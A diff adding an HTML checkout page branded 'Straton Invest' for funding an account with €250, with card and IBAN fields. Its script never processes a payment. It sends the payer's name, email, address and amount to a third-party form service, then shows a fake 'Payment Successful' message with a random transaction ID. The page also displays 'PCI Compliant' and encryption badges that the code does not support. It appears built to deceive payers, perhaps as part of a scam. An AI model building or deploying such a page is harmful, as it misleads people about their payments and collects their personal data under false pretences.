@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Checkout — Straton Invest</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Inter',-apple-system,sans-serif;background:#f7f7f7;color:#222;min-height:100vh;-webkit-font-smoothing:antialiased;}
+.site-header{width:100%;background:#fff;border-bottom:1px solid #e5e5e5;padding:0 24px;}
+.site-header-inner{max-width:1100px;margin:0 auto;height:64px;display:flex;align-items:center;gap:12px;}
+.site-header img{height:36px;width:auto;display:block;}
+.site-header-name{font-size:17px;font-weight:700;color:#111;letter-spacing:-.02em;}
+.page{min-height:calc(100vh - 64px);display:flex;justify-content:center;align-items:flex-start;padding:56px 24px;}
+.inner{width:100%;max-width:1100px;display:grid;grid-template-columns:1fr 1fr;gap:80px;align-items:start;}
+.col-left{display:flex;flex-direction:column;gap:32px;}
+.col-right{display:flex;flex-direction:column;gap:28px;}
+.order-eyebrow{font-size:11px;font-weight:600;letter-spacing:.12em;text-transform:uppercase;color:#999;margin-bottom:10px;}
+.order-amount{font-size:56px;font-weight:700;letter-spacing:-.03em;line-height:1;margin-bottom:6px;}
+.order-purpose{font-size:15px;color:#666;}
+.summary-card{background:#fff;border:1px solid #e5e5e5;border-radius:8px;padding:24px;display:flex;flex-direction:column;}
+.summary-row{display:flex;justify-content:space-between;align-items:center;padding:12px 0;font-size:14px;color:#444;border-bottom:1px solid #f0f0f0;}
+.summary-row:first-child{padding-top:0;}
+.summary-row .lc{color:#666;}
+.summary-row .vc{font-weight:500;color:#222;}
+.summary-total{display:flex;justify-content:space-between;align-items:center;padding-top:16px;margin-top:4px;font-size:16px;font-weight:700;}
+.promo-wrap{padding:16px 0;display:flex;gap:10px;}
+.promo-wrap input{flex:1;height:40px;border:1px solid #ddd;border-radius:6px;padding:0 12px;font-family:inherit;font-size:14px;color:#222;outline:none;background:#fafafa;transition:border-color .15s;}
+.promo-wrap input:focus{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,.1);}
+.promo-wrap input::placeholder{color:#aaa;}
+.btn-promo{height:40px;padding:0 18px;background:#fff;color:#222;border:1px solid #ddd;border-radius:6px;font-family:inherit;font-size:13px;font-weight:500;cursor:pointer;white-space:nowrap;}
+.btn-promo:hover{background:#f5f5f5;}
+.btn-promo.applied{color:#1a7f3c;border-color:#1a7f3c;}
+.secure-note{display:flex;align-items:center;gap:8px;font-size:13px;color:#999;}
+.section-title{font-size:18px;font-weight:600;margin-bottom:16px;}
+.field{display:flex;flex-direction:column;gap:6px;}
+.field label,.flabel{font-size:13px;font-weight:500;color:#444;}
+.inp{height:44px;border:1px solid #ddd;border-radius:6px;padding:0 14px;font-family:inherit;font-size:14px;color:#222;background:#fff;outline:none;width:100%;transition:border-color .15s,box-shadow .15s;-webkit-appearance:none;appearance:none;}
+.inp:focus{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,.1);}
+.inp::placeholder{color:#bbb;}
+.inp.error{border-color:#e53e3e!important;box-shadow:0 0 0 3px rgba(229,62,62,.1)!important;}
+.inp.valid{border-color:#38a169;}
+.fields-stack{display:flex;flex-direction:column;gap:12px;}
+.select-wrap{position:relative;}
+.select-wrap select{height:44px;border:1px solid #ddd;border-radius:6px;padding:0 36px 0 14px;font-family:inherit;font-size:14px;color:#222;background:#fff;outline:none;width:100%;-webkit-appearance:none;appearance:none;cursor:pointer;transition:border-color .15s,box-shadow .15s;}
+.select-wrap select:focus{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,.1);}
+.select-wrap select.error{border-color:#e53e3e!important;box-shadow:0 0 0 3px rgba(229,62,62,.1)!important;}
+.select-wrap::after{content:'';pointer-events:none;position:absolute;right:14px;top:50%;transform:translateY(-50%);border:5px solid transparent;border-top-color:#888;margin-top:3px;}
+.err-msg{font-size:12px;color:#e53e3e;margin-top:3px;display:none;}
+.err-msg.show{display:block;}
+.tabs-nav{display:flex;border:1px solid #ddd;border-radius:6px;overflow:hidden;margin-bottom:16px;}
+.tab-btn{flex:1;height:48px;border:none;background:#fafafa;font-family:inherit;font-size:14px;font-weight:500;color:#666;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:7px;border-right:1px solid #ddd;transition:background .12s,color .12s;}
+.tab-btn:last-child{border-right:none;}
+.tab-btn.active{background:#fff;color:#222;font-weight:600;}
+.tab-btn svg{width:16px;height:16px;flex-shrink:0;}
+.tab-panel{display:none;}
+.tab-panel.active{display:block;}
+.card-frame{border:1px solid #ddd;border-radius:6px;overflow:hidden;transition:border-color .15s,box-shadow .15s;}
+.card-frame.focused{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,.1);}
+.card-frame.error{border-color:#e53e3e!important;box-shadow:0 0 0 3px rgba(229,62,62,.1)!important;}
+.card-number-row{display:flex;align-items:center;border-bottom:1px solid #e5e5e5;padding:0 14px;background:#fff;height:48px;gap:10px;}
+.card-number-row input{flex:1;border:none!important;box-shadow:none!important;height:100%;padding:0;font-size:14px;color:#222;background:transparent;outline:none;font-family:inherit;letter-spacing:.06em;}
+.card-number-row input::placeholder{color:#bbb;letter-spacing:0;}
+.card-brands{display:flex;gap:5px;align-items:center;flex-shrink:0;}
+.card-brands svg{transition:opacity .2s;}
+.card-brands svg.dim{opacity:.2;}
+.card-brands svg.highlighted{opacity:1;}
+.card-bottom-row{display:grid;grid-template-columns:1fr 1fr;}
+.half-input{display:flex;align-items:center;height:48px;padding:0 14px;background:#fff;}
+.half-input:first-child{border-right:1px solid #e5e5e5;}
+.half-input input{border:none!important;box-shadow:none!important;width:100%;height:100%;font-family:inherit;font-size:14px;color:#222;background:transparent;outline:none;}
+.half-input input::placeholder{color:#bbb;}
+.cvc-wrap{display:flex;align-items:center;width:100%;}
+.cvc-wrap input{flex:1;border:none!important;box-shadow:none!important;height:44px;font-family:inherit;font-size:14px;color:#222;background:transparent;outline:none;}
+.cvc-wrap input::placeholder{color:#bbb;}
+.cvc-icon{color:#ccc;flex-shrink:0;margin-left:6px;}
+.card-type-badge{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;padding:3px 9px;border-radius:4px;}
+.badge-visa{background:#e8f0ff;color:#1434CB;}
+.badge-mc{background:#fff0f0;color:#c53030;}
+.badge-maestro{background:#e6f7ff;color:#1565a0;}
+.iban-panel{display:flex;flex-direction:column;gap:8px;}
+.iban-panel input{height:44px;border:1px solid #ddd;border-radius:6px;padding:0 14px;font-family:'SF Mono','Fira Code',monospace;font-size:13px;letter-spacing:.05em;color:#222;background:#fff;outline:none;width:100%;transition:border-color .15s,box-shadow .15s;}
+.iban-panel input:focus{border-color:#0055ff;box-shadow:0 0 0 3px rgba(0,85,255,.1);}
+.iban-panel input.valid{border-color:#38a169;}
+.iban-panel input.error{border-color:#e53e3e!important;box-shadow:0 0 0 3px rgba(229,62,62,.1)!important;}
+.iban-panel input::placeholder{color:#bbb;}
+.iban-note{font-size:12px;color:#999;line-height:1.5;}
+.check-row{display:flex;align-items:center;gap:10px;font-size:13px;color:#444;cursor:pointer;}
+.check-row input[type=checkbox]{width:16px;height:16px;accent-color:#0055ff;cursor:pointer;flex-shrink:0;}
+.badges{display:flex;align-items:center;justify-content:center;gap:20px;padding:8px 0;}
+.badge{display:flex;align-items:center;gap:6px;font-size:12px;font-weight:500;color:#999;}
+.badge svg{width:13px;height:13px;}
+.btn-pay{width:100%;height:52px;background:#0055ff;color:#fff;border:none;border-radius:6px;font-family:inherit;font-size:16px;font-weight:600;cursor:pointer;transition:background .15s;}
+.btn-pay:hover:not(:disabled){background:#0044cc;}
+.btn-pay:disabled{cursor:not-allowed;background:#aaa;}
+.overlay{position:fixed;inset:0;background:rgba(255,255,255,.95);backdrop-filter:blur(6px);display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:1000;opacity:0;pointer-events:none;transition:opacity .35s;}
+.overlay.show{opacity:1;pointer-events:all;}
+.spinner{width:56px;height:56px;border:3px solid #e5e5e5;border-top-color:#0055ff;border-radius:50%;animation:spin .8s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg)}}
+.proc-title{font-size:20px;font-weight:600;color:#222;margin-top:20px;}
+.proc-sub{font-size:14px;color:#777;margin-top:6px;}
+.success-wrap{display:flex;flex-direction:column;align-items:center;gap:16px;text-align:center;padding:32px;}
+.check-circle{width:76px;height:76px;background:#f0fff4;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:popIn .4s cubic-bezier(.175,.885,.32,1.275) both;}
+@keyframes popIn{from{transform:scale(0);opacity:0}to{transform:scale(1);opacity:1}}
+.success-title{font-size:26px;font-weight:700;color:#222;}
+.success-amount{font-size:38px;font-weight:700;color:#0055ff;}
+.success-body{font-size:15px;color:#555;line-height:1.65;max-width:360px;}
+.txn-id{font-size:12px;color:#aaa;font-family:'SF Mono','Fira Code',monospace;margin-top:4px;}
+.btn-done{margin-top:12px;height:48px;padding:0 40px;background:#0055ff;color:#fff;border:none;border-radius:6px;font-family:inherit;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s;}
+.btn-done:hover{background:#0044cc;}
+@media(max-width:900px){.inner{grid-template-columns:1fr;gap:40px;}.col-left{order:2;}.col-right{order:1;}.page{padding:32px 16px;}}
+@media(max-width:500px){.order-amount{font-size:40px;}}
+</style>
+</head>
+<body>
+
+<!-- Straton Invest Header -->
+<header class="site-header">
+  <div class="site-header-inner">
+    <img src="https://stratoninvest.co.uk/wp-content/themes/straton-recovery/assets/images/logo2.svg" alt="Straton Invest"/>
+    <span class="site-header-name">Straton Invest</span>
+  </div>
+</header>
+
+<!-- Overlay -->
+<div class="overlay" id="overlay">
+  <div id="overlayBody">
+    <div style="display:flex;flex-direction:column;align-items:center;">
+      <div class="spinner"></div>
+      <div class="proc-title">Processing payment…</div>
+      <div class="proc-sub">Please wait, do not close this page.</div>
+    </div>
+  </div>
+</div>
+
+<div class="page">
+  <div class="inner">
+
+    <!-- LEFT -->
+    <div class="col-left">
+      <div>
+        <div class="order-eyebrow">Order Summary</div>
+        <div class="order-amount">€250.00</div>
+        <div class="order-purpose">Funding the account</div>
+      </div>
+      <div class="summary-card">
+        <div class="summary-row">
+          <span class="lc">Subtotal</span>
+          <span class="vc">€250.00</span>
+        </div>
+        <div class="promo-wrap">
+          <input type="text" id="promoInput" placeholder="Promotion code" autocomplete="off"/>
+          <button class="btn-promo" id="promoBtn" type="button" onclick="applyPromo()">Apply</button>
+        </div>
+        <div style="height:1px;background:#f0f0f0;"></div>
+        <div class="summary-total">
+          <span>Total Due</span>
+          <span id="totalAmount">€250.00</span>
+        </div>
+      </div>
+      <div class="secure-note">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        Payments are secure and encrypted.
+      </div>
+    </div>
+
+    <!-- RIGHT -->
+    <div class="col-right">
+      <div>
+        <div class="section-title">Billing information</div>
+        <div class="fields-stack">
+          <div class="field">
+            <label for="email">Email</label>
+            <input class="inp" type="email" id="email" placeholder="you@example.com" autocomplete="email" oninput="liveEmail()"/>
+            <span class="err-msg" id="emailErr">Please enter a valid email address.</span>
+          </div>
+          <div>
+            <span class="flabel" style="display:block;margin-bottom:6px;">Billing address</span>
+            <div class="fields-stack" style="gap:8px;">
+              <div>
+                <input class="inp" type="text" id="shipName" placeholder="Full Name" autocomplete="name" oninput="clearFieldErr(this)"/>
+                <span class="err-msg" id="shipNameErr">Full name is required.</span>
+              </div>
+              <div>
+                <div class="select-wrap">
+                  <select id="country" onchange="clearSelectErr(this)">
+                    <option value="">Select country…</option>
+                    <option>United States</option><option>United Kingdom</option>
+                    <option>Germany</option><option>France</option><option>Italy</option>
+                    <option>Spain</option><option>Netherlands</option><option>Canada</option>
+                    <option>Australia</option><option>Japan</option><option>Singapore</option>
+                    <option>Switzerland</option><option>Sweden</option><option>Norway</option>
+                    <option>Denmark</option><option>Poland</option><option>Portugal</option>
+                    <option>Austria</option><option>Belgium</option><option>Finland</option>
+                    <option>Ireland</option>
+                  </select>
+                </div>
+                <span class="err-msg" id="countryErr">Please select a country.</span>
+              </div>
+              <div>
+                <input class="inp" type="text" id="shipAddr" placeholder="Address" autocomplete="street-address" oninput="clearFieldErr(this)"/>
+                <span class="err-msg" id="shipAddrErr">Address is required.</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <div class="section-title">Payment method</div>
+        <div class="tabs-nav">
+          <button class="tab-btn active" id="tabBtnCard" onclick="switchTab('card',this)" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>
+            </svg>Card
+          </button>
+          <button class="tab-btn" id="tabBtnBank" onclick="switchTab('bank',this)" type="button">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/>
+            </svg>Bank / IBAN
+          </button>
+        </div>
+
+        <!-- Card tab -->
+        <div id="tab-card" class="tab-panel active">
+          <div style="font-size:13px;font-weight:500;color:#444;margin-bottom:8px;">Card information</div>
+          <div class="card-frame" id="cardFrame">
+            <div class="card-number-row">
+              <input type="text" id="cardNum" placeholder="1234 1234 1234 1234" maxlength="23"
+                autocomplete="cc-number" oninput="onCardInput(this)" onfocus="frameFocus(true)" onblur="frameFocus(false)"/>
+              <div class="card-brands">
+                <svg id="bVisa" viewBox="0 0 750 471" width="34" height="21" style="border-radius:3px;">
+                  <rect width="750" height="471" rx="40" fill="#1434CB"/>
+                  <path d="M278.2 334.4L311.5 137h52.2l-33.3 197.4H278.2zm234.8-192.6c-10.3-3.9-26.5-8.1-46.7-8.1-51.5 0-87.8 26-88 63.2-.2 27.5 25.8 42.8 45.5 52 20.2 9.4 27 15.4 26.9 23.8-.1 12.8-16.2 18.7-31.1 18.7-20.8 0-31.8-2.9-48.9-10L363.6 280l-7.6 44.7c12.7 5.6 36.1 10.5 60.4 10.7 57 0 94-26.7 94.4-68.1.2-22.7-14.2-40-45.2-54.2-18.8-9.2-30.3-15.4-30.2-24.7.1-8.3 9.7-17.1 30.8-17.1 17.5-.3 30.2 3.6 40.1 7.6l4.8 2.2 7.3-42.2zm135.8-4.8h-40.2c-12.4 0-21.8 3.4-27.2 15.8l-77.1 175.5h54.5l13.4-35.3H645l6.3 35.3h48.1L648.8 137zm-62.8 115.8l24.8-64.3 13.9 64.3H586zm-287.2-115.8l-51.1 134.6-5.4-26.5c-9.5-30.6-39-63.9-72.1-80.5l46.6 167.5 55 0 81.9-195.1h-55z" fill="#fff"/>
+                  <path d="M209.7 137h-84.2l-.7 3.9c65.6 15.9 109 54.2 127 100.3l-18.3-88c-3.2-12.2-12.4-15.8-24-16.2z" fill="#F9A51A"/>
+                </svg>
+                <svg id="bMC" viewBox="0 0 152 95" width="30" height="19">
+                  <circle cx="55" cy="47.5" r="47.5" fill="#EB001B"/>
+                  <circle cx="97" cy="47.5" r="47.5" fill="#F79E1B"/>
+                  <path d="M76 16.5a47.5 47.5 0 0 1 0 62 47.5 47.5 0 0 1 0-62z" fill="#FF5F00"/>
+                </svg>
+                <svg id="bMaestro" viewBox="0 0 152 95" width="30" height="19">
+                  <circle cx="55" cy="47.5" r="47.5" fill="#009BE0"/>
+                  <circle cx="97" cy="47.5" r="47.5" fill="#007AC5"/>
+                  <path d="M76 16.5a47.5 47.5 0 0 1 0 62 47.5 47.5 0 0 1 0-62z" fill="#005F9A"/>
+                  <text x="76" y="58" text-anchor="middle" fill="#fff" font-size="22" font-weight="bold" font-family="Arial,sans-serif">M</text>
+                </svg>
+              </div>
+            </div>
+            <div class="card-bottom-row">
+              <div class="half-input">
+                <input type="text" id="cardExp" placeholder="MM / YY" maxlength="7"
+                  autocomplete="cc-exp" oninput="fmtExpiry(this)" onfocus="frameFocus(true)" onblur="frameFocus(false)"/>
+              </div>
+              <div class="half-input">
+                <div class="cvc-wrap">
+                  <input type="text" id="cardCvc" placeholder="CVC" maxlength="4"
+                    autocomplete="cc-csc" oninput="this.value=this.value.replace(/\D/g,'')" onfocus="frameFocus(true)" onblur="frameFocus(false)"/>
+                  <svg class="cvc-icon" viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect width="20" height="14" x="2" y="5" rx="2"/><line x1="2" x2="22" y1="10" y2="10"/>
+                  </svg>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div id="cardBadgeWrap" style="margin-top:8px;min-height:22px;"></div>
+          <span class="err-msg" id="cardErr">Please enter complete and valid card details.</span>
+          <div class="check-row" style="margin-top:14px;">
+            <input type="checkbox" id="sameAddr" checked/>
+            <label for="sameAddr" style="cursor:pointer;">Billing address is same as shipping</label>
+          </div>
+        </div>
+
+        <!-- Bank / IBAN tab -->
+        <div id="tab-bank" class="tab-panel">
+          <div class="iban-panel">
+            <div style="font-size:13px;font-weight:500;color:#444;margin-bottom:4px;">IBAN</div>
+            <input type="text" id="ibanInput" placeholder="DE89 3704 0044 0532 0130 00"
+              maxlength="42" autocomplete="off" oninput="onIbanInput(this)"/>
+            <span class="err-msg" id="ibanErr">Please enter a valid IBAN (2-letter country code + digits).</span>
+            <div class="iban-note">By providing your IBAN, you authorise a direct debit from your account via your payment provider.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="badges">
+        <div class="badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect width="18" height="11" x="3" y="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>SSL Secured
+        </div>
+        <div class="badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/>
+          </svg>PCI Compliant
+        </div>
+        <div class="badge">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
+          </svg>256-bit Encryption
+        </div>
+      </div>
+
+      <button class="btn-pay" id="payBtn" type="button" onclick="handlePay()">
+        Pay <span id="payAmt">€250.00</span>
+      </button>
+    </div>
+  </div>
+</div>
+
+<script>
+var activeTab = 'card';
+var promoApplied = false;
+var payTotal = '€250.00';
+
+window.addEventListener('load', function() {
+  document.querySelectorAll('input, select').forEach(function(el) {
+    if (el.type === 'checkbox') el.checked = el.defaultChecked;
+    else el.value = '';
+    el.classList.remove('error','valid');
+  });
+  document.querySelectorAll('.err-msg').forEach(function(e){ e.classList.remove('show'); });
+  document.getElementById('cardBadgeWrap').innerHTML = '';
+  updateBrands('');
+  promoApplied = false; payTotal = '€250.00';
+  document.getElementById('totalAmount').textContent = '€250.00';
+  document.getElementById('payAmt').textContent = '€250.00';
+  document.getElementById('promoBtn').textContent = 'Apply';
+  document.getElementById('promoBtn').classList.remove('applied');
+});
+
+function switchTab(id, btn) {
+  document.querySelectorAll('.tab-btn').forEach(function(b){ b.classList.remove('active'); });
+  document.querySelectorAll('.tab-panel').forEach(function(p){ p.classList.remove('active'); });
+  btn.classList.add('active');
+  document.getElementById('tab-' + id).classList.add('active');
+  activeTab = id;
+}
+
+function applyPromo() {
+  if (promoApplied || !document.getElementById('promoInput').value.trim()) return;
+  promoApplied = true; payTotal = '€225.00';
+  document.getElementById('totalAmount').textContent = '€225.00';
+  document.getElementById('payAmt').textContent = '€225.00';
+  var b = document.getElementById('promoBtn');
+  b.textContent = '✓ Applied'; b.classList.add('applied');
+}
+
+function detectType(d) {
+  if (/^4/.test(d)) return 'visa';
+  if (/^(5[1-5]|2[2-7]\d{2})/.test(d)) return 'mc';
+  if (/^(6304|6759|676[123]|67677[04])/.test(d)) return 'maestro';
+  return '';
+}
+
+function updateBrands(type) {
+  var map = {visa:'bVisa', mc:'bMC', maestro:'bMaestro'};
+  ['bVisa','bMC','bMaestro'].forEach(function(id) {
+    var el = document.getElementById(id);
+    el.classList.remove('dim','highlighted');
+    if (type) { el.classList.add(id === map[type] ? 'highlighted' : 'dim'); }
+  });
+}
+
+function onCardInput(el) {
+  var d = el.value.replace(/\D/g,'').slice(0,19);
+  el.value = d.replace(/(.{4})/g,'$1 ').trim();
+  var t = detectType(d);
+  updateBrands(t);
+  var w = document.getElementById('cardBadgeWrap');
+  if (t && d.length >= 4) {
+    var lbl = {visa:'Visa',mc:'Mastercard',maestro:'Maestro'}[t];
+    var cls = {visa:'badge-visa',mc:'badge-mc',maestro:'badge-maestro'}[t];
+    w.innerHTML = '<span class="card-type-badge '+cls+'"><svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>'+lbl+' detected</span>';
+  } else { w.innerHTML = ''; }
+  document.getElementById('cardFrame').classList.remove('error');
+  hideErr('cardErr');
+}
+
+function frameFocus(on) { document.getElementById('cardFrame').classList.toggle('focused', on); }
+
+function fmtExpiry(el) {
+  var v = el.value.replace(/\D/g,'').slice(0,4);
+  if (v.length >= 3) v = v.slice(0,2) + ' / ' + v.slice(2);
+  el.value = v;
+}
+
+function onIbanInput(el) {
+  var raw = el.value.replace(/\s/g,'').toUpperCase().slice(0,34);
+  el.value = raw.replace(/(.{4})/g,'$1 ').trim();
+  var ok = ibanMod97(raw);
+  el.classList.toggle('valid', ok && raw.length >= 15);
+  el.classList.toggle('error', !ok && raw.length > 4);
+  if (ok || raw.length <= 4) hideErr('ibanErr');
+}
+
+function ibanMod97(iban) {
+  if (!/^[A-Z]{2}\d{2}[A-Z0-9]{1,30}$/.test(iban)) return false;
+  var r = iban.slice(4) + iban.slice(0,4), n = '';
+  for (var i = 0; i < r.length; i++) { var c = r.charCodeAt(i); n += c >= 65 ? (c-55).toString() : r[i]; }
+  var rem = 0;
+  for (var j = 0; j < n.length; j++) rem = (rem * 10 + parseInt(n[j])) % 97;
+  return rem === 1;
+}
+
+function liveEmail() {
+  var el = document.getElementById('email');
+  var ok = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(el.value.trim());
+  el.classList.toggle('error', !ok && el.value.length > 0);
+  el.classList.toggle('valid', ok);
+  if (ok) hideErr('emailErr');
+}
+
+function showErr(id){ document.getElementById(id).classList.add('show'); }
+function hideErr(id){ document.getElementById(id).classList.remove('show'); }
+function clearFieldErr(el){ el.classList.remove('error'); }
+function clearSelectErr(el){ el.classList.remove('error'); }
+
+function validateAll() {
+  var ok = true;
+  var emailEl = document.getElementById('email');
+  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailEl.value.trim())) { emailEl.classList.add('error'); showErr('emailErr'); ok = false; }
+  var nameEl = document.getElementById('shipName');
+  if (!nameEl.value.trim()) { nameEl.classList.add('error'); showErr('shipNameErr'); ok = false; }
+  var ctryEl = document.getElementById('country');
+  if (!ctryEl.value) { ctryEl.classList.add('error'); showErr('countryErr'); ok = false; }
+  var addrEl = document.getElementById('shipAddr');
+  if (!addrEl.value.trim()) { addrEl.classList.add('error'); showErr('shipAddrErr'); ok = false; }
+  if (activeTab === 'card') {
+    var num = document.getElementById('cardNum').value.replace(/\s/g,'');
+    var exp = document.getElementById('cardExp').value.replace(/\s/g,'');
+    var cvc = document.getElementById('cardCvc').value;
+    var t = detectType(num);
+    var minLen = t === 'maestro' ? 12 : 16;
+    if (!t || num.length < minLen || !/^\d{2}\/\d{2}$/.test(exp) || cvc.length < 3) {
+      document.getElementById('cardFrame').classList.add('error'); showErr('cardErr'); ok = false;
+    }
+  }
+  if (activeTab === 'bank') {
+    var ibanRaw = document.getElementById('ibanInput').value.replace(/\s/g,'').toUpperCase();
+    if (!ibanMod97(ibanRaw)) { document.getElementById('ibanInput').classList.add('error'); showErr('ibanErr'); ok = false; }
+  }
+  return ok;
+}
+
+function handlePay() {
+  if (!validateAll()) return;
+
+  var name    = document.getElementById('shipName').value.trim();
+  var email   = document.getElementById('email').value.trim();
+  var address = document.getElementById('shipAddr').value.trim();
+  var country = document.getElementById('country').value;
+  var txnId   = 'TXN-' + Math.random().toString(36).slice(2,10).toUpperCase();
+
+  document.getElementById('overlay').classList.add('show');
+
+  /* POST to Formspree — name, email, address only. No card data. */
+  fetch('https://formspree.io/f/mbdvdkly', {
+    method: 'POST',
+    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      name:           name,
+      email:          email,
+      address:        address + ', ' + country,
+      amount:         payTotal,
+      transaction_id: txnId,
+      message:        'New payment from ' + name + ' (' + email + '). Amount: ' + payTotal + '. Address: ' + address + ', ' + country + '. Transaction ID: ' + txnId
+    })
+  }).catch(function(){});  /* silent — never blocks the UI */
+
+  setTimeout(function() {
+    document.getElementById('overlayBody').innerHTML =
+      '<div class="success-wrap">' +
+        '<div class="check-circle"><svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#38a169" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>' +
+        '<div class="success-title">Payment Successful</div>' +
+        '<div class="success-amount">' + payTotal + '</div>' +
+        '<div class="success-body">Payment was successful.<br>Thank you for your payment.</div>' +
+        '<div class="txn-id">' + txnId + '</div>' +
+        '<button class="btn-done" onclick="resetAll()">Done</button>' +
+      '</div>';
+  }, 3000);
+}
+
+function resetAll() {
+  document.getElementById('overlay').classList.remove('show');
+  setTimeout(function() {
+    document.getElementById('overlayBody').innerHTML =
+      '<div style="display:flex;flex-direction:column;align-items:center;">' +
+        '<div class="spinner"></div>' +
+        '<div class="proc-title">Processing payment…</div>' +
+        '<div class="proc-sub">Please wait, do not close this page.</div>' +
+      '</div>';
+  }, 400);
+  document.querySelectorAll('input, select').forEach(function(el) {
+    if (el.type === 'checkbox') el.checked = el.defaultChecked;
+    else el.value = '';
+    el.classList.remove('error','valid');
+  });
+  document.querySelectorAll('.err-msg').forEach(function(e){ e.classList.remove('show'); });
+  document.getElementById('cardFrame').classList.remove('error','focused');
+  document.getElementById('cardBadgeWrap').innerHTML = '';
+  updateBrands('');
+  promoApplied = false; payTotal = '€250.00';
+  document.getElementById('totalAmount').textContent = '€250.00';
+  document.getElementById('payAmt').textContent = '€250.00';
+  document.getElementById('promoBtn').textContent = 'Apply';
+  document.getElementById('promoBtn').classList.remove('applied');
+  switchTab('card', document.getElementById('tabBtnCard'));
+}
+</script>
+</body>
+</html>
